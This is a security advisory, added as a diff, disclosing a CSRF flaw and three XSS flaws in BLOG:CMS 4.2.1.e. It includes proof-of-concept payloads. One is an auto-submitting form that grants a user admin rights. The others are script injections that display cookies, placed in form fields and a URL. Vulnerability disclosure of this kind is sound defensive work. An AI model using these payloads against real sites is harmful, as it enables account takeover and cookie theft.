@@ -1,0 +1,81 @@
+Vulnerability ID: HTB22727
+Reference: http://www.htbridge.ch/advisory/xsrf_csrf_in_blogcms.html
+Product: BLOG:CMS
+Vendor: Radek Hulán ( http://blogcms.com/ ) 
+Vulnerable Version: 4.2.1.e and probably prior versions
+Vendor Notification: 30 November 2010 
+Vulnerability Type: CSRF (Cross-Site Request Forgery)
+Status: Not Fixed, Vendor Alerted
+Risk level: Low 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 
+
+XSRF/CSRF:
+Vulnerability Details:
+The vulnerability exists due to failure in the "admin/libs/ADMIN.php" script to properly verify the source of HTTP request.
+
+Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+Attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+
+<form action="http://host/admin/index.php" method="post" name="main">
+<input type="hidden" name="action" value="changemembersettings">
+<input type="hidden" name="memberid" value="USER_UD">
+<input type="hidden" name="name" value="tester">
+<input type="hidden" name="realname" value="tester">
+<input type="hidden" name="password" value="">
+<input type="hidden" name="repeatpassword" value="">
+<input type="hidden" name="email" value="email@example.com">
+<input type="hidden" name="url" value="">
+<input type="hidden" name="admin" value="1">
+<input type="hidden" name="canlogin" value="1">
+<input type="hidden" name="notes" value="">
+<input type="hidden" name="deflang" value="">
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+Stored XSS (HTB22724): 
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the "action.php" script to properly sanitize user-supplied input in "body" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. Enter comment like <script>alert('XSS')</script> in "Add new comment" form.
+
+
+XSS (HTB22725):
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the "admin/index.php" script to properly sanitize user-supplied input in "amount" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/admin/index.php" method="post" name="main">
+<input type="hidden" name="blogid" value="0">
+<input type="hidden" name="itemid" value="0">
+<input type="hidden" name="action" value="browseowncomments">
+<input type="hidden" name="amount" value='10"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="start" value="0">
+<input type="hidden" name="search" value="">
+</form>
+<script>
+document.main.submit();
+</script>
+
+Solution: Upgrade to the most recent version
+
+
+XSS(HTB22726):
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the "admin/index.php" script to properly sanitize user-supplied input in "action" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+http://host/admin/index.php?action=settingsedit"><script>alert(document.cookie)</script>
+Solution: Upgrade to the most recent version
+
